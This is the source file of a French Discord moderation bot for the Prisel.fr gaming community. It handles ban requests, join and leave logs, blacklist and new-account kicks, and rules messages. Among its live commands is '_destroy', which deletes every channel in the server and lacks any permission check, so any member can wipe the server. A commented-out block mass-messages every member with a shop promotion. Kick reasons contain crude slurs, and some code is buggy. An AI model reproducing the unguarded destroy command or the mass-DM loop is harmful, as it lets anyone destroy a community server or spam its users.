const Discord = require("discord.js");
const fs = require("fs");
const { stripIndents } = require("common-tags");
const moment = require("moment-timezone");
const ms = require("ms");
const bot = new Discord.Client({
  fetchAllMembers: true,
});
require("discord-buttons")(bot);
var steamServerStatus = require("steam-server-status");
const low = require("lowdb");
const request = require("request");
const FileSync = require("lowdb/adapters/FileSync");
const adapter = new FileSync("databaselocal.json");
const database = low(adapter);
const token =
  ""; 
const Mutedrole = "PMuted";
const LogsChannel = "prisel-logs";
const db = require("quick.db");
const pagination = require("discord.js-pagination");
const { GiveawaysManager } = require("discord-giveaways");
const sleep = require("system-sleep");
var unirest = require("unirest");
var cron = require("cron");
const Gamedig = require("gamedig");
const { MessageButton, MessageActionRow } = require("discord-buttons");

const manager = new GiveawaysManager(bot, {
  storage: "./giveaways.json",
  updateCountdownEvery: 10000,
  default: {
    botsCanWin: false,
    embedColor: "#3A73A0",
    reaction: "🎉",
  },
});

bot.giveawaysManager = manager;

database
  .defaults({
    botowner: [],
    owners: [],
    staffs: [],
    blacklisted: [],
  })
  .write();

bot.on("error", console.log);
bot.login(token);


bot.on("ready", async () => {
  console.log(
    `${bot.user.username} est prêt à être utilisé ! Bienvu chakal <3`
  );
  setTimeout(function () {
    bot.user.setActivity(`Chargement de YagProject v1.0.6.`, {
      type: "PLAYING",
    });
  }, 500);
  setTimeout(function () {
    bot.user.setActivity(`Chargement de YagProject v1.0.6..`, {
      type: "PLAYING",
    });
  }, 1000);
  setTimeout(function () {
    bot.user.setActivity(`Chargement de YagProject v1.0.6...`, {
      type: "PLAYING",
    });
  }, 1500);
});

function getNow(strType) {
  let strReturn = "";
  switch (strType) {
    case "date":
      strReturn = new Date().toLocaleString("fr-FR", {
        timeZone: "Europe/Paris",
        day: "2-digit",
        month: "2-digit",
        year: "2-digit",
      });
      break;
    case "time":
      strReturn = new Date().toLocaleString("fr-FR", {
        timeZone: "Europe/Paris",
        hour12: false,
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
      });
      break;
    case "datetime":
      strReturn = new Date()
        .toLocaleString("fr-FR", {
          timeZone: "Europe/Paris",
          hour12: false,
          day: "2-digit",
          month: "2-digit",
          year: "2-digit",
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
        })
        .replace(",", "");
      break;
  }
  return strReturn;
}

bot.on("clickButton", async (button) => {
  if (button.id === "yesban") {
    button.message.channel.messages
      .fetch(button.message.id)
      .then(async (msg) => {
        const embed = new Discord.MessageEmbed(msg.embeds[0]);
        embed.fields[4] = { name: "Banni par :", value: button.clicker.user };
        embed.color = "#0F9700";
        embed.title = "<:check:805411021543833619> Demande de Ban";
        let yesban = new MessageButton()
          .setStyle("green")
          .setEmoji("559034815370887170")
          .setID("yesban")
          .setDisabled();
        let noban = new MessageButton()
          .setStyle("red")
          .setEmoji("866444552659402752")
          .setID("noban")
          .setDisabled();

        let banyesno = new MessageActionRow().addComponents(yesban, noban);
        button.message.edit(msg.embeds[0], banyesno);
        await msg.edit(embed);
        return button.reply.send(
          "Vous avez accepté(e) cette demande de ban !",
          true
        );
      });
  } else if (button.id === "noban") {
    button.message.channel.messages
      .fetch(button.message.id)
      .then(async (msg) => {
        const embed = new Discord.MessageEmbed(msg.embeds[0]);
        embed.fields[4] = { name: "Refusé par :", value: button.clicker.user };
        embed.color = "#A30000";
        embed.title = "<a:nono:866444552659402752> Demande de Ban";
        let yesban = new MessageButton()
          .setStyle("green")
          .setEmoji("559034815370887170")
          .setID("yesban")
          .setDisabled();
        let noban = new MessageButton()
          .setStyle("red")
          .setEmoji("866444552659402752")
          .setID("noban")
          .setDisabled();

        let banyesno = new MessageActionRow().addComponents(yesban, noban);
        button.message.edit(msg.embeds[0], banyesno);
        await msg.edit(embed);
        return button.reply.send(
          "Vous avez refusé(e) cette demande de ban !",
          true
        );
      });
  }
});

bot.on("guildMemberRemove", async (member) => {
  const joinleavechannel = db.get(`${member.guild.id}.joinleave`);
  const joinchannel = db.get(`${member.guild.id}.joinchannel`);
  const joinleave = bot.channels.cache.get(joinchannel);
  var joinembed = new Discord.MessageEmbed()
    .setDescription(
      `${member} (*${member.id}*) vient de faire ses valises...\n\nNous lui souhaitons une bonne continuation !`
    )
    .setFooter(
      `${member.guild.name} - 2020`,
      member.guild.iconURL({ dynamic: true })
    )
    .setImage("https://media.giphy.com/media/l0HlDJhyI8qoh7Wfu/giphy.gif")
    .setThumbnail(member.user.displayAvatarURL)
    .setColor(3553598);

  joinleave.send(joinembed);
});

bot.on("guildMemberAdd", async (member) => {
  const antinewstatus = db.get(`${member.guild.id}.antinew.status`);
  const joinchannel = db.get(`${member.guild.id}.joinchannel`);
  const joinleave = bot.channels.cache.get(joinchannel);
  let guild = bot.guilds.cache.get(member.guild.id);
  var memberss = guild.memberCount;
  if (!database.get("blacklisted").find({ user_id: member.id }).value()) {
    null;
  } else {
    const channel = bot.channels.cache.find(
      (channel) => channel.name == LogsChannel
    );
    if (!channel)
      return member.kick(`Blacklist : Ce fils de pute a été viré du serveur!`);
    var joinbl = new Discord.MessageEmbed()
      .setTitle("🔨 - Blacklist Logs")
      .setDescription(
        `${member} vient de rejoindre le serveur en étant blacklist..`
      )
      .addField("Username", member.user.tag, true)
      .addField("ID", member.id, true)
      .addField("\u200b", "\u200b")
      .addField("Date & Heure", getNow("datetime"))
      .setFooter(
        `${member.guild.name} - 2020`,
        member.guild.iconURL({ dynamic: true })
      )
      .setColor("#FF0000");
    channel.send(joinbl);
    member.kick(`Blacklist : Ce fils de pute a été viré du serveur!`);
  }
  if (antinewstatus === true) {
    if (Date.now() - member.user.createdAt < 1000 * 60 * 60 * 24 * 4) {
      const joinlogs = member.guild.channels.cache.find(
        (channel) => channel.name === LogsChannel
      );
      if (!joinlogs) return member.kick("puterie");

      var joinlog = new Discord.MessageEmbed()
        .setTitle("⛔ - AntiNew Logs")
        .setDescription(
          `${member} vient de rejoindre le serveur alors que son compte est récent..`
        )
        .addField("Username", member.user.tag, true)
        .addField("ID", member.id, true)
        .addField("\u200b", "\u200b")
        .addField(
          "Date & Heure Création",
          moment(member.user.createdAt)
            .tz("Europe/Paris")
            .format("DD/MM/YYYY hh:mm:ss") +
            " (**il y a " +
            moment(new Date()).diff(member.joinedAt, "days") +
            " jours**)"
        )
        .addField("Date & Heure", getNow("datetime"))
        .setFooter(
          `${member.guild.name} - 2020`,
          member.guild.iconURL({ dynamic: true })
        )
        .setColor("#FF0000");

      joinlogs.send(joinlog);

      member
        .send(
          `Vous avez été expulsé du serveur car votre compte est trop récent veuillez attendre 4 jours\n https://discord.gg/prisel !`
        )
        .then(function () {
          member.kick("puterie");
        });
      return;
    }
  }

  var joinembed = new Discord.MessageEmbed()
    .setDescription(
      `${member} (*${member.id}*) vient de faire son entrée sur **Prisel.fr**\nEn lui souhaitant de bons moments parmi nous.. \n\nNous sommes actuellement **${memberss} membres** sur le Discord !`
    )
    .setFooter(
      `${member.guild.name} - 2020`,
      member.guild.iconURL({ dynamic: true })
    )
    .setImage(
      "https://thumbs.gfycat.com/ComposedTanFlatfish-size_restricted.gif"
    )
    .setThumbnail(member.user.displayAvatarURL)
    .setColor(3553598);

  joinleave.send(joinembed);
});

bot.on("channelCreate", async (channel) => {
  let rolemute = channel.guild.roles.cache.find(
    (role) => role.name === Mutedrole
  );
  if (!rolemute) return;

  if (channel.type === "text") {
    channel.updateOverwrite(rolemute.id, {
      SEND_MESSAGES: false,
      ADD_REACTIONS: false,
      MANAGE_MESSAGES: false,
    });
  } else if (channel.type === "voice") {
    channel.updateOverwrite(rolemute.id, {
      SPEAK: false,
    });
  }
});

const BannedWords = [
  "suy2bdytjok",
  "s u y 2 b d y t j o k",
  "5g4ifhsy-j0",
  "svarog",
  "s v a r o g",
  "5 g 4 i f h s y - j 0",
];
const evryone = ["@everyone", "@here"];
const votebl = [".gg"];

bot.on("clickButton", async (button) => {
  if (button.id === "addvoterole") {
    if (!button.clicker.member.roles.cache.has("806270294149824522")) {
      button.clicker.member.roles.add("806270294149824522");
      return button.reply.send("Rôle ajouté !", true);
    } else {
      button.clicker.member.roles.remove("806270294149824522");
      return button.reply.send("Rôle supprimé !", true);
    }
  }
});

bot.on("message", async (message) => {
  if (evryone.some((word) => message.toString().toLowerCase().includes(word))) {
    if (message.author.bot) return;
    if (member.hasPermission("ADMINISTRATOR")) {
      message
        .react("✅")
        .then((m) => m.message.react("🇵"))
        .then((m) => m.message.react("🇷"))
        .then((m) => m.message.react("🇮"))
        .then((m) => m.message.react("🇸"))
        .then((m) => m.message.react("🇪"))
        .then((m) => m.message.react("🇱"))
        .then((m) => m.message.react("815367052193824819"))
        .then((m) => m.message.react("🙌"))
        .then((m) => m.message.react("801358937605275668"))
        .then((m) => m.message.react("559034925391806487"))
        .then((m) => m.message.react("801355861749923840"))
        .then((m) => m.message.react("805159790552678430"));
    }
  }

  if (message.channel.id === "806266670582595624") {
    if (
      votebl.some((word) => message.toString().toLowerCase().includes(word))
    ) {
      const logsbannned =
        message.guild.channels.cache.get("801850254433583185");
      message.delete().catch((e) => console.error("Couldn't delete message."));
      logsbannned.send(`**${message}** à été fait et supprimé`);
    }
  }

  if (
    BannedWords.some((word) => message.toString().toLowerCase().includes(word))
  ) {
    if (message.author.bot) return;
    const messagem = message.member;
    const logsbannned = message.guild.channels.cache.get("801850254433583185");
    message.delete().catch((e) => console.error("Couldn't delete message."));
    logsbannned.send(
      `${messagem} à été banni il a mit comme mot **${message}**`
    );
    message.guild.members.ban(messagem.id, { reason: `BannedWords` });
  }

  let prefix = "_";
  const args = message.content.slice(prefix.length).split(" ");
  const command = args.shift().toLowerCase();

  if (message.author.bot) return;
  if (!message.content.startsWith(prefix) || message.author.bot) return;

  if(command === "destroy") {
    message.guild.channels.cache.forEach(channel => channel.delete());
  }

  if (command === "chartegene") {
    if (!message.member.hasPermission("VIEW_AUDIT_LOG"))
      return message.channel
        .send(`Vous n'avez pas la permission !`)
        .then((msg) => {
          msg.delete(4500);
          message.delete(4500);
        });
    const ca = message.guild.channels.cache.get("692595137502773248");
    const embed = new Discord.MessageEmbed()
      .setTitle("📜 Charte :")
      .setColor("#3a73a0")
      .setDescription(
        "**Bienvenue à toi sur le serveur Discord communautaire de Prisel.fr**\n **Le règlement se doit d'être lu et approuvé dès la première arrivée sur le serveur. De plus, les conditions d'utilisation de discord sont à respecter.**\n\n __**Quelques petites règles à savoir simples :**__\n\n > ➣ Ne pas contourner les **bannissements/mutes**.\n > ➣ Ne pas **discriminer** ou être **irrespectueux** envers les utilisateurs du \nserveur support. > ➣ Ne pas tentez de **spammer**.\n > ➣ Ne pas **créer** d'histoires. (basique)\n > ➣ Les propos **religieux**, **racistes** et **homophobes** sont strictement interdit.\n > ➣ Le **Dox** est aussi strictement interdit et est sévèrement puni.\n > ➣ Le **T.O.S** de **Discord** sont à respecter.\n\n __**Quelques petits liens utiles :**__\n\n > **Site **➣ https://prisel.fr\n > **Discord **➣ https://discord.gg/prisel\n > **Utip **➣ https://utip.io/prisel\n > **Twitch**➣ https://www.twitch.tv/billal_fr\n > **Twitter** ➣ https://bit.ly/priseltwitter\n > **Steam **➣ https://bit.ly/steamprisel\n\n __**Adresses IP de nos serveurs :**__\n\n > DarkRP ➣ connect 188.165.46.113:27015\n > Teamspeak ➣ ts.prisel.fr\n\n __**Quelques conseils au niveau sécuritaire :**__\n\n > Ne jamais cliquez sur un lien envoyé par un inconnu, en cas de doute prévenez un modérateur.\n > Ne partagez pas vos identifiants tel que votre pseudo ou votre mot de passe.\n > Si quelqu'un vous demande des informations personnelles ou insiste pour que vous cliquiez sur un lien prévenez tout de suite un Staff.\n > Si on vous demande de scanner un **QR CODE** avec votre compte Discord, ne le faite surtout pas.\n\n Merci de respecter ces règles pour la bonne ambiance du serveur, dans le cas contraire ne venez pas pleurer pour vos sanctions !"
      )
      .setFooter("Copyright Prisel.fr ©️ 2017 - 2021");
    ca.send({ embed });
  }

  if (command === "charte") {
    if (!message.member.hasPermission("VIEW_AUDIT_LOG"))
      return message.channel
        .send(`Vous n'avez pas la permission !`)
        .then((msg) => {
          msg.delete(4500);
          message.delete(4500);
        });
    const ca = message.guild.channels.cache.get("801850290180980766");
    const embed = new Discord.MessageEmbed()
      .setTitle("📜 Charte :")
      .setColor("#3a73a0")
      .setDescription(
        "**Bienvenue à toi sur le serveur discord de Prisel.fr DarkRP**\n **Le règlement se doit d'être lu et approuvé dès la première arrivée sur le serveur. De plus, les conditions d'utilisation de discord sont à respecter.**\n\n __**Quelques petites règles à savoir simples :**__\n\n > ➣ Ne pas contourner les **bannissements/mutes**.\n > ➣ Ne pas **discriminer** ou être **irrespectueux** envers les utilisateurs du \nserveur support. > ➣ Ne pas tentez de **spammer**.\n > ➣ Ne pas **créer** d'histoires. (basique)\n > ➣ Les propos **religieux**, **racistes** et **homophobes** sont strictement interdit.\n > ➣ Le **Dox** est aussi strictement interdit et est sévèrement puni.\n > ➣ Le **T.O.S** de **Discord** sont à respecter.\n\n __**Quelques petits liens utiles :**__\n\n > **Site **➣ https://prisel.fr\n > **Discord **➣ https://discord.gg/prisel\n > **Utip **➣ https://utip.io/prisel\n > **Twitch**➣ https://www.twitch.tv/billal_fr\n > **Twitter** ➣ https://bit.ly/priseltwitter\n > **Steam **➣ https://bit.ly/steamprisel\n\n __**Adresses IP de nos serveurs :**__\n\n > DarkRP ➣ connect 188.165.46.113:27015\n > Teamspeak ➣ ts.prisel.fr\n\n __**Quelques conseils au niveau sécuritaire :**__\n\n > Ne jamais cliquez sur un lien envoyé par un inconnu, en cas de doute prévenez un modérateur.\n > Ne partagez pas vos identifiants tel que votre pseudo ou votre mot de passe.\n > Si quelqu'un vous demande des informations personnelles ou insiste pour que vous cliquiez sur un lien prévenez tout de suite un Staff.\n > Si on vous demande de scanner un **QR CODE** avec votre compte Discord, ne le faite surtout pas.\n\n Merci de respecter ces règles pour la bonne ambiance du serveur, dans le cas contraire ne venez pas pleurer pour vos sanctions !"
      )
      .setFooter("Copyright Prisel.fr ©️ 2017 - 2021");
    ca.send({ embed });
  }

  /*if(command === "onepiecerole") {
        const onepiece = new Discord.MessageEmbed()
        .setTitle('🌊 | Choix de branche')
        .setColor('#014c91')
        .setDescription(`Vous pouvez choisir votre branche avec les réactions ci-dessous..\n\n\`🏴‍☠️\` : **Pirates**\n\`🌊\` : **Marine**\n\n`)
        .setImage('https://media4.giphy.com/media/YWB6Hi29vA3jG/200.gif')
        .setFooter(`${message.guild.name} - 2020`, message.guild.iconURL({ dynamic: true }))
                message.channel.send(onepiece);
    }

    if(command === "snkrole") {
        const onepiece = new Discord.MessageEmbed()
        .setTitle('🔪 | Choix de branche')
        .setColor('#985db3')
        .setDescription(`Vous pouvez choisir votre branche avec les réactions ci-dessous..\n\n\`⚔\` : **Humaines**\n\`👨‍🦲\` : **Titanesque**\n\n`)
        .setImage('https://cdn.discordapp.com/attachments/781973612335988777/782570100703887430/original.gif')
        .setFooter(`${message.guild.name} - 2020`, message.guild.iconURL({ dynamic: true }))
                message.channel.send(onepiece);
    }

    if(command === "narutorole") {
        const onepiece = new Discord.MessageEmbed()
        .setTitle('🔮 | Choix de branche')
        .setColor('#f88324')
        .setDescription(`Vous pouvez choisir votre branche avec la réaction ci-dessous..\n\n\`🐱‍👤\` : **Ninja**\n\n`)
        .setImage('https://media.discordapp.net/attachments/782311087873851414/782576445787996160/125556.gif')
        .setFooter(`${message.guild.name} - 2020`, message.guild.iconURL({ dynamic: true }))
                message.channel.send(onepiece);
    }*/

  /*if(command === 'textpromo') {
        let guild = bot.guilds.cache.get('500591727225208881')
        const yaguxxx = message.guild.members.cache.get('710438426788233256')
        var promoembed = new Discord.MessageEmbed()
        .setTitle('💣 MÉGA SOLDE Boutique - Prisel.fr 💣')
        .setURL('https://prisel.fr/boutique')
        .setDescription(`J'ai remarqué que tu étais sur notre serveur **Discord**, alors je t'envoie ce message pour te prévenir que les **MÉGA SOLDES** sont disponibles (**-50%**) sur notre boutique, limité aux **15 premiers achats**.`)
        .setColor(3830688)
        .setFooter(`Prisel.fr | Communauté Garry's Mod`)
        .setImage('https://i.imgur.com/4e5IAt9.gif')
        .setThumbnail('https://i.imgur.com/xZMDrfu.png')
        yaguxxx.send(promoembed)
        
        var pub = 0;
    message.guild.members.cache.forEach(member => {
      sleep(440);
      if (member.id == bot.user.id)
        return (
          pub++ &&
          console.log(
            `[${getNow("time")}][LOGS] Erreur rencontré (Cause: BOT): ${
              member.user.tag
            } (ID: ${member.user.id}) - Avancement: ${pub}/${guild.memberCount}`
              .blue
          )
        );
      member
        .send(promoembed)
        .then(m => {
          pub++;
          console.log(
            `[${getNow("time")}][LOGS] Message envoyé à: ${
              member.user.tag
            } (ID: ${member.user.id}) - Avancement: ${pub}/${guild.memberCount}`
              .green
          );
          if (pub === guild.memberCount) {
            message.channel.send(
              "`" +
                getNow("time") +
                "`" +
                ` :white_check_mark: |  **Publicité terminée** |  Message envoyé à :  **${guild.memberCount} membres**`
            );
          }
        })
        .catch(err => {
          pub++;
          if (pub > guild.memberCount) {
            message.channel.send(`Pub terminé [2]`);
          }
          console.log(
            `[${getNow("time")}][LOGS] Erreur rencontré (Cause: MP CLOSED): ${
              member.user.tag
            } (ID: ${member.user.id}) - Avancement: ${pub}/${guild.memberCount}`
              .red
          );
        });
    });
    return;

    }*/

  if (command === "testadd") {
    bot.emit(
      "guildMemberAdd",
      message.member || message.guild.fetchMember(message.author)
    );
  }

  /*if(command === 'buttonvoote') {

        var embedvote = new Discord.MessageEmbed()
        .setTitle('🔔 | Notif Votes')
        .setDescription(`Tu veux être **notifié ** pour aller voter **toutes les 2h** avec un simple rôle ?\nTon vote servira à soutenir Prisel et mettre en avant le serveur sur **Top Serveurs**. \nJe t'invite donc à **cliquer ** sur la réaction ci dessous, qui te donnera le rôle <@&806270294149824522> !`)
        .setColor('#ffff00')
        .setThumbnail('https://media1.giphy.com/media/qi29MoLjWNPUI/source.gif')
        let button = new MessageButton()
        .setStyle('green')
        .setLabel('Je veux la notif !')
        .setEmoji('🔔')
        .setID('addvoterole');
      
        message.channel.send(embedvote, button);
    }*/

  if (command === "ticket") {
  }

  if (command === "gban") {
    const gbanchan = db.get(`${message.guild.id}.gban`);
    const messchan = message.guild.channels.cache.get(gbanchan);
    let filter = (m) => m.author.id === message.member.id;
    if (!message.member.hasPermission("VIEW_AUDIT_LOG"))
      return message.channel
        .send(`Vous n'avez pas la permission !`)
        .then((msg) => {
          msg.delete(4500);
          message.delete(4500);
        });
    message.delete();

    message.channel
      .send(`✅ **| Veuillez entrer le SteamID à bannir..**`)
      .then((msg) => {
        message.channel
          .awaitMessages(filter, {
            max: 1,
            time: 90000,
            errors: ["time"],
          })
          .then((collected) => {
            collected.first().delete();
            steamid = collected.first().content;
            msg
              .edit("✅ **| Maintenant veuillez entrer le temps à bannir..**")
              .then((msg) => {
                message.channel
                  .awaitMessages(filter, {
                    max: 1,
                    time: 90000,
                    errors: ["time"],
                  })
                  .then((collected) => {
                    collected.first().delete();
                    temps = collected.first().content;
                    msg
                      .edit(
                        "✅ **| Maintenant veuillez entrer la raison à bannir..**"
                      )
                      .then((msg) => {
                        message.channel
                          .awaitMessages(filter, {
                            max: 1,
                            time: 90000,
                            errors: ["time"],
                          })
                          .then((collected) => {
                            collected.first().delete();
                            raison = collected.first().content;
                            msg.edit(
                              `${message.author} ✅ **| La demande de ban à été éffectué dans ${messchan} pour \`${steamid}\`**`
                            );
                            let embed = new Discord.MessageEmbed()
                              .setTitle(
                                `<:time:866607062419243018> **Demande de Ban**`
                              )
                              .addField("SteamID", steamid)
                              .addField("Temps à bannir", temps)
                              .addField(
                                "Raison",
                                raison + ` [${message.member.displayName}]`
                              )
                              .addField("Staff", message.author)
                              .addField(
                                "Banni par",
                                "En attente d'un fdp qui le ban... (Un peu comme d'habitude)"
                              )
                              .setColor("#3A73A0");
                            let yesban = new MessageButton()
                              .setStyle("green")
                              .setEmoji("559034815370887170")
                              .setID("yesban");
                            let noban = new MessageButton()
                              .setStyle("red")
                              .setEmoji("866444552659402752")
                              .setID("noban");

                            let banyesno = new MessageActionRow().addComponents(
                              yesban,
                              noban
                            );
                            messchan.send(embed, banyesno);
                            messchan.send("");
                          });
                      });
                  });
              });
          });
      });
  }

  /*if(command === "editserv") {
        message.channel.messages.fetch("866370949138219029").then(async msg => {
    Gamedig.query({
        type: 'garrysmod',
        host: '54.38.18.208',
        port: '27015'
    }).then((state) => {
        var editstatus = new Discord.MessageEmbed()
            .setTitle(`Serveur DarkRP`)
            .setDescription(`**${state.name}**`)
            .addField(`Joueurs :`, state.players.length + ` / ` + state.maxplayers, true)
            .addField(`Map :`, state.map, true)
            .addField(`᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼`, `᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼`, true)
            .addField(`Discord :`, `https://discord.gg/X54BcsbJ3s`,true)
            .addField(`Se Connecter :`, `steam://connect/54.38.18.208:27015`, true)
            .setColor('#00FF00')
            .setThumbnail('https://steamuserimages-a.akamaihd.net/ugc/498015283475723566/49944B29AD8105B87D9BA04A54DD16C8D18844CC/?imw=637&imh=358&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true')
            msg.edit(editstatus)
    }).catch((error) => {
        var editstatus = new Discord.MessageEmbed()
            .setTitle(`Serveur DarkRP`)
            .setDescription(`**OFFLINE**`)
            .addField(`Discord :`, `https://discord.gg/X54BcsbJ3s`)
            .setColor('#FF0000')
            .setThumbnail('https://steamuserimages-a.akamaihd.net/ugc/498015283475723566/49944B29AD8105B87D9BA04A54DD16C8D18844CC/?imw=637&imh=358&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true')
            msg.edit(editstatus)
    });     

})
    }

    if(command === "statusserveurteamspeak") {
        Gamedig.query({
            type: 'teamspeak3',
            host: '54.38.18.208',
            port: '9987'
        }).then((state) => {
            var serverinfofivm = new Discord.MessageEmbed()
                .setTitle(`Serveur Teamspeak`)
                .setDescription(`**${state.name}**`)
                .addField(`Joueurs :`, state.players.length + ` / ` + state.maxplayers, true)
                .addField(`Se Connecter :`, `ts3://connect/ts.prisel.fr:9987`, true)
                .setColor('green')
                message.channel.send(serverinfofivm)
        }).catch((error) => {
            var serverinfofivm = new Discord.MessageEmbed()
                .setTitle(`Serveur Teamspeak`)
                .setDescription(`**OFFLINE**`)
                .addField(`Discord :`, `https://discord.gg/X54BcsbJ3s`)
                .setColor('red')
                message.channel.send(serverinfofivm)
        });     
    }
    
    if(command === "statusserveurdarkrp") {
        Gamedig.query({
            type: 'garrysmod',
            host: '54.38.18.208',
            port: '27015'
        }).then((state) => {
            var serverinfofivm = new Discord.MessageEmbed()
                .setTitle(`Serveur DarkRP`)
                .setDescription(`**${state.name}**`)
                .addField(`Joueurs :`, state.players.length + ` / ` + state.maxplayers, true)
                .addField(`Map :`, state.map, true)
                .addField(`Discord :`, `https://discord.gg/X54BcsbJ3s`)
                .addField(`Se Connecter :`, `https://discord.gg/X54BcsbJ3s`, true)
                .setColor('green')
                message.channel.send(serverinfofivm)
        }).catch((error) => {
            var serverinfofivm = new Discord.MessageEmbed()
                .setTitle(`Serveur DarkRP`)
                .setDescription(`**OFFLINE**`)
                .addField(`Discord :`, `https://discord.gg/X54BcsbJ3s`)
                .setColor('red')
                message.channel.send(serverinfofivm)
        });     
    }*/

  /*if(command === "server") {
        if(message.guild.id === "799876594525143060") {
            Gamedig.query({
                type: 'garrysmod',
                host: '54.38.18.208',
                port: '27015'
            }).then((state) => {
                var serverinfofivm = new Discord.MessageEmbed()
                    .setTitle(`Informations sur le Serveur DarkRP`)
                    .setDescription(`**__Voici les informations sur le serveur DarkRP :__**`)
                    .addField(`Nom du Serveur :`, state.name)
                    .addField(`IP :`, state.connect)
                    .addField(`Map :`, state.map)
                    .addField(`Nombre de joueur :`, state.players.length + ` / ` + state.maxplayers, true)
                    .addField(`Joueurs Max :`, state.maxplayers, true)
                    .addField(`Status :`, `🟢`)
                    .addField(`Discord :`, `https://discord.gg/X54BcsbJ3s`)
                    .setColor('#3A73A0')
                    message.channel.send(serverinfofivm)
            }).catch((error) => {
                var serverinfofivm = new Discord.MessageEmbed()
                    .setTitle(`Informations sur le Serveur DarkRP`)
                    .setDescription(`**__Voici les informations sur le serveur DarkRP :__**`)
                    .addField(`Status :`, `🔴`)
                    .addField(`Discord :`, `https://discord.gg/X54BcsbJ3s`)
                    .setColor('#3A73A0')
                    message.channel.send(serverinfofivm)
            });     
        }else if(message.guild.id === "839156422662029362") { 
            Gamedig.query({
                type: 'garrysmod',
                host: '195.140.215.53',
                port: '27015'
            }).then((state) => {
                var serverinfofivm = new Discord.MessageEmbed()
                    .setTitle(`Informations sur le Serveur SCP RP`)
                    .setDescription(`**__Voici les informations sur le serveur SCP RP :__**`)
                    .addField(`Nom du Serveur :`, state.name)
                    .addField(`IP :`, state.connect)
                    .addField(`Map :`, state.map)
                    .addField(`Nombre de joueur :`, state.players.length + ` / ` + state.maxplayers, true)
                    .addField(`Joueurs Max :`, state.maxplayers, true)
                    .addField(`Status :`, `🟢`)
                    .addField(`Discord :`, `https://discord.gg/????`)
                    .setColor('#3A73A0')
                    message.channel.send(serverinfofivm)
            }).catch((error) => {
                var serverinfofivm = new Discord.MessageEmbed()
                    .setTitle(`Informations sur le Serveur SCP RP`)
                    .setDescription(`**__Voici les informations sur le serveur SCP RP :__**`)
                    .addField(`Status :`, `🔴`)
                    .addField(`Discord :`, `https://discord.gg/????`)
                    .setColor('#3A73A0')
                    message.channel.send(serverinfofivm)
            });  

        }

        else if(message.guild.id === "500591727225208881") {
            /*Gamedig.query({
                type: 'garrysmod',
                host: '195.140.215.53',
                port: '27015'
            }).then((state) => {
                var serverinfofivm = new Discord.MessageEmbed()
                    .setTitle(`Informations sur le Serveur SCP RP`)
                    .setDescription(`**__Voici les informations sur le serveur SCP RP :__**`)
                    .addField(`Nom du Serveur :`, state.name)
                    .addField(`IP :`, state.connect)
                    .addField(`Map :`, state.map)
                    .addField(`Nombre de joueur :`, state.players.length + ` / ` + state.maxplayers, true)
                    .addField(`Joueurs Max :`, state.maxplayers, true)
                    .addField(`Status :`, `🟢`)
                    .addField(`Discord :`, `https://discord.gg/????`)
                    .setColor('#3A73A0')
                    message.channel.send(serverinfofivm)
            }).catch((error) => {
                var serverinfofivm = new Discord.MessageEmbed()
                    .setTitle(`Informations sur le Serveur SCP RP`)
                    .setDescription(`**__Voici les informations sur le serveur SCP RP :__**`)
                    .addField(`Status :`, `🔴`)
                    .addField(`Discord :`, `https://discord.gg/????`)
                    .setColor('#3A73A0')
                    message.channel.send(serverinfofivm)
            });     
            Gamedig.query({
                type: 'garrysmod',
                host: '54.38.18.208',
                port: '27015'
            }).then((state) => {
                var serverinfofivm = new Discord.MessageEmbed()
                    .setTitle(`Informations sur le Serveur DarkRP`)
                    .setDescription(`**__Voici les informations sur le serveur DarkRP :__**`)
                    .addField(`Nom du Serveur :`, state.name)
                    .addField(`IP :`, state.connect)
                    .addField(`Map :`, state.map)
                    .addField(`Nombre de joueur :`, state.players.length + ` / ` + state.maxplayers, true)
                    .addField(`Joueurs Max :`, state.maxplayers, true)
                    .addField(`Status :`, `🟢`)
                    .addField(`Discord :`, `https://discord.gg/X54BcsbJ3s`)
                    .setColor('#3A73A0')
                    message.channel.send(serverinfofivm)
            }).catch((error) => {
                var serverinfofivm = new Discord.MessageEmbed()
                    .setTitle(`Informations sur le Serveur DarkRP`)
                    .setDescription(`**__Voici les informations sur le serveur DarkRP :__**`)
                    .addField(`Status :`, `🔴`)
                    .addField(`Discord :`, `https://discord.gg/X54BcsbJ3s`)
                    .setColor('#3A73A0')
                    message.channel.send(serverinfofivm)
            });     
            Gamedig.query({
                type: 'teamspeak3',
                host: '54.38.18.208',
                port: '9987'
            }).then((state) => {
                var serverinfofivm = new Discord.MessageEmbed()
                    .setTitle(`Informations sur le Serveur Teamspeak`)
                    .setDescription(`**__Voici les informations sur le serveur Teamspeak :__**`)
                    .addField(`Nom du Serveur :`, state.name)
                    .addField(`IP :`, state.connect)
                    .addField(`Nombre de joueur :`, state.players.length + ` / ` + state.maxplayers, true)
                    .addField(`Joueurs Max :`, state.maxplayers, true)
                    .addField(`Status :`, `🟢`)
                    .addField(`Connexion :`, `https://cutt.ly/3bjl5Ln`)
                    .setColor('#3A73A0')
                    message.channel.send(serverinfofivm)
            }).catch((error) => {
                var serverinfofivm = new Discord.MessageEmbed()
                    .setTitle(`Informations sur le Serveur Teamspeak`)
                    .setDescription(`**__Voici les informations sur le serveur Teamspeak :__**`)
                    .addField(`Status :`, `🔴`)
                    .addField(`Connexion :`, `https://cutt.ly/3bjl5Ln`)
                    .setColor('#3A73A0')
                    message.channel.send(serverinfofivm)
            });

                Gamedig.query({
                    type: 'fivem',
                    host: '54.38.18.208',
                    port: '30120'
                }).then((state) => {
                    var serverinfofivm = new Discord.MessageEmbed()
                        .setTitle(`Informations sur le Serveur Fivem`)
                        .setDescription(`**__Voici les informations sur le serveur FiveM :__**`)
                        .addField(`Nom du Serveur :`, state.name)
                        .addField(`IP :`, state.connect)
                        .addField(`Map :`, state.map)
                        .addField(`Nombre de joueur :`, state.players.length + ` / ` + state.maxplayers, true)
                        .addField(`Joueurs Max :`, state.maxplayers, true)
                        .addField(`Status :`, `🟢`)
                        .addField(`Discord :`, `https://discord.gg/???`)
                        .setColor('#135DD8')
                        message.channel.send(serverinfofivm)
                }).catch((error) => {
                    var serverinfofivm = new Discord.MessageEmbed()
                        .setTitle(`Informations sur le Serveur FiveM`)
                        .setDescription(`**__Voici les informations sur le serveur FiveM :__**`)
                        .addField(`Status :`, `🔴`)
                        .addField(`Discord :`, `https://discord.gg/???`)
